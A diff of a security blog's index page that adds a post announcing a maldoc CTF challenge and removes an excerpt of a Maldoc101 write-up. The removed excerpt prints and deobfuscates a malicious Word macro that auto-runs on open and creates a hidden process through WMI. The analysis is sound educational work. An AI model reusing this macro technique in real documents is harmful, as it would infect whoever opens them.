@@ -37,6 +37,34 @@
     <article class="post-item">
         <header class="article-header">
             <h2 class="post-title">
+                <a href="../the-emprisa-maldoc-challenge.html">The Emprisa Maldoc Challenge</a>
+            </h2>
+            <div class="article-meta">
+                <time datetime="2021-04-04T16:37:00+08:00">Sun 04 April 2021</time>
+                <span>•</span>
+                <a href="../category/ctf.html">ctf</a>
+            </div>
+        </header>
+
+        <div class="article-content">
+            <p>I was inspired to make my own CTF challenge after finishing <a href="{filename}/maldoc101-writeup-part-1">Maldoc101</a> found at <a href="https://cyberdefenders.org/">Cyberdefenders.org</a>. The challenge I made is called <a href="https://cyberdefenders.org/labs/56">Emprisa Maldoc</a> and it is now up on their website. </p>
+<p>Emprisa is based on a malicious document that I downloaded blindly from a malware sandbox. It used a relatively old but still interesting exploit that is still in use today. After researching more about it I came across a tool that can generate a malicious doc using the same exact exploit. This is when I got the idea to turn it into a challenge.</p>
+<p><img alt="the-emprisa-maldoc-challenge-01" src="../images/the-emprisa-maldoc-challenge-01.png" /></p>
+<p>The challenge has 14 questions with increasing and varying difficulty. The challenge is targeted towards intermediate analysts who already have experience examining maldocs before. The goal is to reinforce the use of common malware analysis tools, but at the same time, teach players new things and techniques. It involves flexing muscles related to open source intelligence, examining shellcodes, and debugging processes. </p>
+<p>I don't want to spoil too much but if you are for it, you can give it a go <a href="https://cyberdefenders.org/labs/51">here</a>. It was hella fun to make and I do hope that it is also as fun to solve!</p>
+<hr />
+<p>Official write-up with hints coming soon.</p>
+<p>I would like to extend my thanks to the team behind CyberDefenders.org. They accepted my submission, reviewed it, and worked with me in improving it. And also to <a href="https://twitter.com/jstrosch">Josh Stroschein</a> for making Maldoc101 and being kind enough to entertain me with my questions related to making challenges.</p>
+        </div>
+
+        <div class="tags">
+            <a href="../tag/maldoc.html" class="tag">maldoc</a>
+            <a href="../tag/ctf.html" class="tag">ctf</a>
+        </div>
+    </article>
+    <article class="post-item">
+        <header class="article-header">
+            <h2 class="post-title">
                 <a href="../ioli-crackme-0x03.html">IOLI Crackme 0x03</a>
             </h2>
             <div class="article-meta">
@@ -121,266 +149,6 @@ queegthaen = giakfeiw + roubhaol.joefwoefcheaw
 
 <p>At the end of the code above <code>queegthaen</code> now contains the value <code>Win32_Process</code> + <code>s</code> + <code>tar</code> + <code>tu</code> + <code>P</code>. Or when combined creates the string <code>Win32_ProcessstartuP</code> which probably refers <a href="https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-processstartup">to this WMI class</a> in the Microsoft docs.</p>
 <p><em>Note: This writeup appears to be incomplete. For the complete analysis, please refer to <a href="../maldoc101-writeup-part-1.html">part 1</a> of this series.</em></p>
-        </div>
-
-        <div class="tags">
-            <a href="../tag/re.html" class="tag">re</a>
-            <a href="../tag/malware_analysis.html" class="tag">malware_analysis</a>
-            <a href="../tag/malware.html" class="tag">malware</a>
-        </div>
-    </article>
-    <article class="post-item">
-        <header class="article-header">
-            <h2 class="post-title">
-                <a href="../maldoc101-writeup-part-1.html">Maldoc101 Writeup (Part 1)</a>
-            </h2>
-            <div class="article-meta">
-                <time datetime="2021-03-13T08:34:00+08:00">Sat 13 March 2021</time>
-                <span>•</span>
-                <a href="../category/malware_analysis.html">malware_analysis</a>
-            </div>
-        </header>
-
-        <div class="article-content">
-            <p>This is part 1 out of 2 of my writeup for the Maldoc101 challenge made by Josh Stroschein (<a href="https://twitter.com/jstrosch">@jstrosch</a>) and is currently playable at <a href="https://cyberdefenders.org/labs/51">Cyberdefenders.Org</a>. I've done some maldoc analysis before but this is the first time I'm writing about my approach.</p>
-<p>There is also an already existing writeup about this challenge <a href="https://github.com/jstrosch/malware-samples/blob/master/malware_analysis_exercises/2020/December/solution.md">from the creator himself</a>. You should check that out if you want a more detailed and focused writeup. This writeup is more from the perspective of someone relatively new to malware analysis. There's a lot more exploration and trial-and-error which, I hope, might give the reader a different view in how this kind of problem is approached.</p>
-<h2 id="the-challenge">The challenge</h2>
-<h3 id="name">Name</h3>
-<p><a href="https://cyberdefenders.org/labs/51">MalDoc101 - Malicious Document</a></p>
-<h3 id="description">Description</h3>
-<p>It is common for threat actors to utilize living off the land (LOTL) techniques, such as the execution of PowerShell to further their attacks and transition from macro code. This challenge is intended to show how you can often times perform quick analysis to extract important IOCs. The focus of this exercise is on static techniques for analysis.</p>
-<h3 id="suggested-tools">Suggested Tools</h3>
-<ul>
-<li>REMnux Virtual Machine (remnux.org)</li>
-<li>Terminal/Command prompt w/ Python installed</li>
-<li>Oledump</li>
-<li>Text editor</li>
-</ul>
-<h2 id="the-easy-questions">The easy questions</h2>
-<p>The first question seems very easy. The <em>suggested tools</em> section above also gives us an idea how to approach this.</p>
-<blockquote>
-<p>What streams contain macros in this document? (comma-separated, ascending).</p>
-</blockquote>
-<p><a href="https://blog.didierstevens.com/programs/oledump-py/">oledump.py</a> is a tool made by <a href="https://blog.didierstevens.com/about/">Didier Stevens</a> that allows the analysis of data streams found in OLE files such as MS Office documetns. Running the command below would show us which streams have macros in it. These are denoted with the character <em>M</em>.</p>
-<div class="codehilite"><pre><span></span><code><span class="gp">$ </span>oledump.py<span class="w"> </span>sample.bin
-<span class="go">  1:       114 &#39;\x01CompObj&#39;</span>
-<span class="go">  2:      4096 &#39;\x05DocumentSummaryInformation&#39;</span>
-<span class="go">  3:      4096 &#39;\x05SummaryInformation&#39;</span>
-<span class="go">  4:      7119 &#39;1Table&#39;</span>
-<span class="go">  5:    101483 &#39;Data&#39;</span>
-<span class="go">  6:       581 &#39;Macros/PROJECT&#39;</span>
-<span class="go">  7:       119 &#39;Macros/PROJECTwm&#39;</span>
-<span class="go">  8:     12997 &#39;Macros/VBA/_VBA_PROJECT&#39;</span>
-<span class="go">  9:      2112 &#39;Macros/VBA/__SRP_0&#39;</span>
-<span class="go"> 10:       190 &#39;Macros/VBA/__SRP_1&#39;</span>
-<span class="go"> 11:       532 &#39;Macros/VBA/__SRP_2&#39;</span>
-<span class="go"> 12:       156 &#39;Macros/VBA/__SRP_3&#39;</span>
-<span class="go"> 13: M    1367 &#39;Macros/VBA/diakzouxchouz&#39;</span>
-<span class="go"> 14:       908 &#39;Macros/VBA/dir&#39;</span>
-<span class="go"> 15: M    5705 &#39;Macros/VBA/govwiahtoozfaid&#39;</span>
-<span class="go"> 16: m    1187 &#39;Macros/VBA/roubhaol&#39;</span>
-<span class="go"> 17:        97 &#39;Macros/roubhaol/\x01CompObj&#39;</span>
-<span class="go"> ...</span>
-</code></pre></div>
-
-<p>I later noticed that there is an upper-case and lower-case <em>M</em>. I learned that the upper-case <em>M</em> denotes a macro with a code. The lower-case denotes a user form. This is a distinction that will be important later in this challenge.</p>
-<hr />
-<blockquote>
-<p>What command-line argument with Oledump do you use to view the raw content of a stream? (Do not include the leading dash) </p>
-</blockquote>
-<p>The next question is another easy one which ran easily be solved through <code>oledump.py</code>'s <em>--help</em> parameter.</p>
-<div class="codehilite"><pre><span></span><code><span class="gp">$ </span>oledump.py<span class="w"> </span>--help
-<span class="go">Usage: oledump.py [options] [file]</span>
-<span class="go">Analyze OLE files (Compound Binary Files)</span>
-
-<span class="go">Options:</span>
-<span class="go">  --version             show program&#39;s version number and exit</span>
-<span class="go">  -h, --help            show this help message and exit</span>
-<span class="go">  -m, --man             Print manual</span>
-<span class="go">  -s SELECT, --select=SELECT</span>
-<span class="go">                        select item nr for dumping (a for all)</span>
-<span class="go">  -d, --dump            perform dump</span>
-<span class="go">  -x, --hexdump         perform hex dump</span>
-<span class="go">  -a, --asciidump       perform ascii dump</span>
-<span class="go">  -A, --asciidumprle    perform ascii dump with RLE</span>
-<span class="go">  -S, --strings         perform strings dump</span>
-<span class="go">  -T, --headtail        do head &amp; tail</span>
-<span class="go">  -v, --vbadecompress   VBA decompression</span>
-<span class="go">  ...</span>
-</code></pre></div>
-
-<p>The answer to question number two is easy to spot.</p>
-<hr />
-<blockquote>
-<p>What event is used to begin the execution of the macros?  </p>
-</blockquote>
-<p>I used a different tool for this particular question mostly because I knew that it already shows the information I need to answer the question. The tool is called <code>olevba</code> which is part of the <a href="https://github.com/decalage2/oletools">oletools</a> package of Python tools. <em>Olevba</em> is used for extracting and analyzing VBA macro source code for MS Office documents.</p>
-<div class="codehilite"><pre><span></span><code><span class="gp">$ </span>olevba<span class="w"> </span>sample.bin
-<span class="go">+----------+--------------------+---------------------------------------------+</span>
-<span class="go">|Type      |Keyword             |Description                                  |</span>
-<span class="go">+----------+--------------------+---------------------------------------------+</span>
-<span class="go">|AutoExec  |Document_open       |Runs when the Word or Publisher document is  |</span>
-<span class="go">|          |                    |opened                                       |</span>
-<span class="go">|Suspicious|Create              |May execute file or a system command through |</span>
-<span class="go">|          |                    |WMI                                          |</span>
-<span class="go">|Suspicious|showwindow          |May hide the application                     |</span>
-<span class="go">|Suspicious|CreateObject        |May create an OLE object                     |</span>
-<span class="go">...</span>
-</code></pre></div>
-
-<h2 id="onto-the-main-event">Onto the main event</h2>
-<blockquote>
-<p>What malware family was this maldoc attempting to drop?</p>
-</blockquote>
-<p>I figured that the way for me to determine the answer for the question above is to start investigating the macro codes included in the document.</p>
-<p>I knew from the previous question that the entry point to begin the execution of the macros is with the function <code>Document_open()</code>. The next step is to look for this entry point and go through the code to understand what the macro is doing.</p>
-<p>To view the contents of a stream, I used the command below:</p>
-<div class="codehilite"><pre><span></span><code><span class="gp">$ </span>oledump.py<span class="w"> </span>sample.bin<span class="w"> </span>-s<span class="w"> </span><span class="m">13</span><span class="w"> </span>-v
-<span class="go">Attribute VB_Name = &quot;diakzouxchouz&quot;</span>
-<span class="go">Attribute VB_Base = &quot;1Normal.ThisDocument&quot;</span>
-<span class="go">Attribute VB_GlobalNameSpace = False</span>
-<span class="go">Attribute VB_Creatable = False</span>
-<span class="go">Attribute VB_PredeclaredId = True</span>
-<span class="go">Attribute VB_Exposed = True</span>
-<span class="go">Attribute VB_TemplateDerived = True</span>
-<span class="go">Attribute VB_Customizable = True</span>
-<span class="go">Private Sub _</span>
-<span class="go">Document_open()</span>
-<span class="go">boaxvoebxiotqueb</span>
-<span class="go">End Sub</span>
-</code></pre></div>
-
-<p>In the above output, I saw that <code>Document_open()</code> contains a single line of code which is a call to function <code>boaxvoebxiotqueb'</code>. This function is included in stream <code>15</code> which can be viewed with the command:</p>
-<div class="codehilite"><pre><span></span><code>$<span class="w"> </span>oledump.py<span class="w"> </span>sample.bin<span class="w"> </span>-s<span class="w"> </span><span class="m">13</span><span class="w"> </span>-v
-Attribute<span class="w"> </span><span class="nv">VB_Name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;govwiahtoozfaid&quot;</span>
-Function<span class="w"> </span>boaxvoebxiotqueb<span class="o">()</span>
-<span class="nv">gooykadheoj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>Chr<span class="o">(</span>roubhaol.Zoom<span class="w"> </span>+<span class="w"> </span>Int<span class="o">(</span><span class="m">5</span><span class="w"> </span>*<span class="w"> </span><span class="m">3</span><span class="o">))</span>
-Dim<span class="w"> </span>c7�ATOQe2�j<span class="w"> </span>As<span class="w"> </span>Integer
-c7�ATOQe2�j<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">6</span>
-Do<span class="w"> </span>While<span class="w"> </span>c7�ATOQe2�j<span class="w"> </span>&lt;<span class="w"> </span><span class="m">6</span><span class="w"> </span>+<span class="w"> </span><span class="m">2</span>
-c7�ATOQe2�j<span class="w"> </span><span class="o">=</span><span class="w"> </span>c7�ATOQe2�j<span class="w"> </span>+<span class="w"> </span><span class="m">5</span>:<span class="w"> </span>DoEvents
-Loop
-<span class="nv">haothkoebtheil</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqw2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqin2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqm2342772g3&amp;*gs7712ffvs626fqgm2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqt2342772g3&amp;*gs7712ffvs626fq&quot;</span><span class="w"> </span>+<span class="w"> </span>gooykadheoj<span class="w"> </span>+<span class="w"> </span><span class="s2">&quot;2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fq:w2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqin2342772g3&amp;*gs7712ffvs626fq322342772g3&amp;*gs7712ffvs626fq_2342772g3&amp;*gs7712ffvs626fq&quot;</span><span class="w"> </span>+<span class="w"> </span>roubhaol.joefwoefcheaw<span class="w"> </span>+<span class="w"> </span><span class="s2">&quot;2342772g3&amp;*gs7712ffvs626fqr2342772g3&amp;*gs7712ffvs626fqo2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqc2342772g3&amp;*gs7712ffvs626fqes2342772g3&amp;*gs7712ffvs626fqs2342772g3&amp;*gs7712ffvs626fq&quot;</span>
-...
-</code></pre></div>
-
-<p>The above output contains more lines of what looks like gibberish code. Upon further inspection I realized that it's actually obfuscated. I can see common coding patterns which tells me that I could make sense of the code if I step through it and organize it so it is easy to understand.</p>
-<p>The first line of the <code>boaxvoebxiotqueb</code> shows:</p>
-<div class="codehilite"><pre><span></span><code>gooykadheoj = Chr(roubhaol.Zoom + Int(5 * 3))
-</code></pre></div>
-
-<p>What's <code>roubhaol</code>? Since this is the first line in the function, I know that it is not a locally defined variable. It must be declared somplace else.</p>
-<p>After looking around I learned that <code>roubhaol</code> is a the name of the user form at stream <em>16</em>.</p>
-<div class="codehilite"><pre><span></span><code><span class="go">16: m    1187 &#39;Macros/VBA/roubhaol&#39;</span>
-</code></pre></div>
-
-<p>So the next step is figuring out what <code>roubhaol.Zoom</code>'s value is. This value is not set anywhere in any of the macros by code. This means that the value is set in the form itself. To confirm, I opened up the Word document, pressed <code>Alt+F11</code> to open up the Visual Basic editor and then opened the <code>roubhaol</code> form. At the bottom we see that the value of <code>Zoom</code> is set to <code>100</code>.</p>
-<p><img alt="maldoc101-writeup-01" src="../images/maldoc101-writeup-01.png" /></p>
-<p>This means that by simulating the first line of code again we find that the variable <code>gooykadheoj</code> gets the character value of <code>s</code>.</p>
-<div class="codehilite"><pre><span></span><code>gooykadheoj = Chr(roubhaol.Zoom + Int(5 <span class="gs">* 3))</span>
-<span class="gs">gooykadheoj = Chr(100 + Int(5 *</span> 3))
-gooykadheoj = Chr(115)
-gooykadheoj = Chr(115) # character &quot;s&quot;
-</code></pre></div>
-
-<p>I then proceeded to go through the next set of lines.</p>
-<div class="codehilite"><pre><span></span><code><span class="nv">Dim</span><span class="w"> </span><span class="nv">c7</span>�<span class="nv">ATOQe2</span>�<span class="nv">j</span><span class="w"> </span><span class="nv">As</span><span class="w"> </span><span class="nv">Integer</span>
-<span class="nv">c7</span>�<span class="nv">ATOQe2</span>�<span class="nv">j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">6</span>
-<span class="k">Do</span><span class="w"> </span><span class="k">While</span><span class="w"> </span><span class="nv">c7</span>�<span class="nv">ATOQe2</span>�<span class="nv">j</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">6</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">2</span>
-<span class="nv">c7</span>�<span class="nv">ATOQe2</span>�<span class="nv">j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">c7</span>�<span class="nv">ATOQe2</span>�<span class="nv">j</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">5</span>:<span class="w"> </span><span class="nv">DoEvents</span>
-<span class="k">Loop</span>
-</code></pre></div>
-
-<p>This one is easier to simulate. <code>c7�ATOQe2�j</code> is assigend 6. And then there's a loop that adds <code>5</code> that eventually results to the value of <code>16</code>.</p>
-<p>But wait, something is fishy here. The variable <code>c7�ATOQe2�j</code> is not found anywhere else after the block of code above. This tells us that this is just junk code that does not really do anything aside from waste an analyst's time! Sneaky sneaky.</p>
-<p>To save me the time I proceeded to remove all junk code. I did this by going through each variables and seeing if they are used somewhere useful. If not, then they are safe to remove.</p>
-<div class="codehilite"><pre><span></span><code>Attribute VB_Name = &quot;govwiahtoozfaid&quot;
-Function boaxvoebxiotqueb()
-    gooykadheoj = Chr(roubhaol.Zoom + Int(5 * 3))
-
-    haothkoebtheil = &quot;2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqw2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqin2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqm2342772g3&amp;*gs7712ffvs626fqgm2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqt2342772g3&amp;*gs7712ffvs626fq&quot; + gooykadheoj + &quot;2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fq:w2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqin2342772g3&amp;*gs7712ffvs626fq322342772g3&amp;*gs7712ffvs626fq_2342772g3&amp;*gs7712ffvs626fq&quot; + roubhaol.joefwoefcheaw + &quot;2342772g3&amp;*gs7712ffvs626fqr2342772g3&amp;*gs7712ffvs626fqo2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqc2342772g3&amp;*gs7712ffvs626fqes2342772g3&amp;*gs7712ffvs626fqs2342772g3&amp;*gs7712ffvs626fq&quot;
-
-    deulsaocthuul = juuvzouchmiopxeox(haothkoebtheil)
-
-    Set tiajriokchaoy = CreateObject(deulsaocthuul)
-
-    deaknaugthein = roubhaol.kaizseah.ControlTipText
-    giakfeiw = deulsaocthuul + gooykadheoj + roubhaol.paerwagyouqumeid.ControlTipText + deaknaugthein
-    queegthaen = giakfeiw + roubhaol.joefwoefcheaw
-
-    Set deavjoajsear = luumlaud(queegthaen)
-
-    xve = Array <span class="ge">_</span>
-<span class="ge">        (&quot;1234444123&quot;, tiajriokchaoy. _</span>
-        Create(geulgelquuuj, kaenhaig, deavjoajsear), &quot;9938723&quot;)
-End Function
-
-Function juuvzouchmiopxeox(yiajthoavheiw)
-    geutyoeytiestheug = yiajthoavheiw
-    feaxgeip = Split(geutyoeytiestheug, &quot;2342772g3&amp;*gs7712ffvs626fq&quot;)
-
-    jaquhoiqu = csqw + Join(feaxgeip, eihnx)
-    juuvzouchmiopxeox = jaquhoiqu
-End Function
-
-Function geulgelquuuj()
-    sjiqw = roubhaol.gaoddaicsauktheb.Pages(10 / 10).ControlTipText
-    geulgelquuuj = juuvzouchmiopxeox(sjiqw)
-End Function
-
-Function luumlaud(zeolkaepxoag)
-    Set luumlaud = CreateObject(zeolkaepxoag)
-    Dim vPu As String
-    vPu = Replace$(&quot;BenqV1�igVwifwdQq&quot;, &quot;BenqV1�i&quot;, &quot;on5�&quot;)
-        luumlaud <span class="ge">_</span>
-<span class="ge">        . _</span>
-        showwindow = (mujgoiy + jioyseertioch) + (neivberziok + xuajroegquoudcaij)
-End Function
-</code></pre></div>
-
-<p>As you can see above, the code is shorter. It's also a little easier to understand. Only a little though, we still need to step through the code carefully to have a better grasp of what it is doing.</p>
-<p>Let's take on the next line:</p>
-<div class="codehilite"><pre><span></span><code>haothkoebtheil = &quot;2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqw2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqin2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqm2342772g3&amp;*gs7712ffvs626fqgm2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqt2342772g3&amp;*gs7712ffvs626fq&quot; + gooykadheoj + &quot;2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fq:w2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqin2342772g3&amp;*gs7712ffvs626fq322342772g3&amp;*gs7712ffvs626fq_2342772g3&amp;*gs7712ffvs626fq&quot; + roubhaol.joefwoefcheaw + &quot;2342772g3&amp;*gs7712ffvs626fqr2342772g3&amp;*gs7712ffvs626fqo2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqc2342772g3&amp;*gs7712ffvs626fqes2342772g3&amp;*gs7712ffvs626fqs2342772g3&amp;*gs7712ffvs626fq&quot;
-</code></pre></div>
-
-<p>If we look at the string carefully we would notice that a set of strings is concatenated with two variables. These variables are <code>gooykadheoj</code> and <code>roubhaol.joefwoefcheaw</code>. We already know the value of <code>gooykadheoj</code>. So what's the value of <code>roubhaol.joefwoefcheaw</code>?</p>
-<p>I got this value by going back to Visual Basic Editor and selelecting <code>joefwoefcheaw</code>. The value we need is listed under <code>Text</code>.</p>
-<p><img alt="maldoc101-writeup-02" src="../images/maldoc101-writeup-02.png" /></p>
-<p>Substituting the values <code>s</code> and <code>P</code> I got the following:</p>
-<div class="codehilite"><pre><span></span><code>haothkoebtheil = &quot;2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqw2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqin2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqm2342772g3&amp;*gs7712ffvs626fqgm2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqt2342772g3&amp;*gs7712ffvs626fqs2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fq:w2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqin2342772g3&amp;*gs7712ffvs626fq322342772g3&amp;*gs7712ffvs626fq_2342772g3&amp;*gs7712ffvs626fqP2342772g3&amp;*gs7712ffvs626fqr2342772g3&amp;*gs7712ffvs626fqo2342772g3&amp;*gs7712ffvs626fq2342772g3&amp;*gs7712ffvs626fqc2342772g3&amp;*gs7712ffvs626fqes2342772g3&amp;*gs7712ffvs626fqs2342772g3&amp;*gs7712ffvs626fq&quot;
-</code></pre></div>
-
-<p>It still doesn't clear up the gibberish, but at least it's now one big string. This same string is then passed as a parameter to function <code>juuvzouchmiopxeox</code>. </p>
-<div class="codehilite"><pre><span></span><code>deulsaocthuul = juuvzouchmiopxeox(haothkoebtheil)
-</code></pre></div>
-
-<p>Let's look at the code inside <code>juuvzouchmiopxeox</code>.</p>
-<div class="codehilite"><pre><span></span><code>Function juuvzouchmiopxeox(yiajthoavheiw)
-    geutyoeytiestheug = yiajthoavheiw
-    feaxgeip = Split(geutyoeytiestheug, &quot;2342772g3&amp;*gs7712ffvs626fq&quot;)
-
-    jaquhoiqu = csqw + Join(feaxgeip, eihnx)
-    juuvzouchmiopxeox = jaquhoiqu
-End Function
-</code></pre></div>
-
-<p>Following the code we could see that the passed string is splitted using the call to the function <code>Split</code> with the substring <code>2342772g3&amp;*gs7712ffvs626fq</code>. This simply means that the substring is removed from the input string. The result of <code>Split</code> is then joined into one string using <code>Join</code>. There are the variables <code>csqw</code> and <code>eihnx</code>, they don't alter the string as these variables are empty. </p>
-<p>At the end of this function the value of the passed string is now:</p>
-<div class="codehilite"><pre><span></span><code><span class="n">winmgmts</span><span class="o">:</span><span class="n">win32_Process</span>
-</code></pre></div>
-
-<p>Aha! Something that is not gibberish for a change!</p>
-<p>Going back to the caller function, the result of <code>juuvzouchmiopxeox</code> is saved to <code>deulsaocthuul</code>.</p>
-<div class="codehilite"><pre><span></span><code>    deulsaocthuul = juuvzouchmiopxeox(haothkoebtheil)
-
-    Set tiajriokchaoy = CreateObject(deulsaocthuul)
-</code></pre></div>
-
-<p>After that an object is created out of <code>deaulsaocthuul</code>, which we know contains <code>winmgmts:win32_Process</code>. </p>
-<p>Looking at <a href="https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-process">the microsoft docs</a> I find out that <code>The Win32_Process WMI class represents a process on an operating system.</code>. Interesting.</p>
-<h2 id="taking-a-step-back">Taking a step back</h2>
-<p>At this point there are already a number of questions that we could answer based on what we've done so far. Some are not yet answerable at the moment, however, so nothing left to do but to push forward. But that will be for the next part of this two part series.</p>
-<p>Until then, I'm taking a step back as I marvel at my progress. It wouldn't take long until all the pieces would fall into place.</p>
         </div>
 
         <div class="tags">
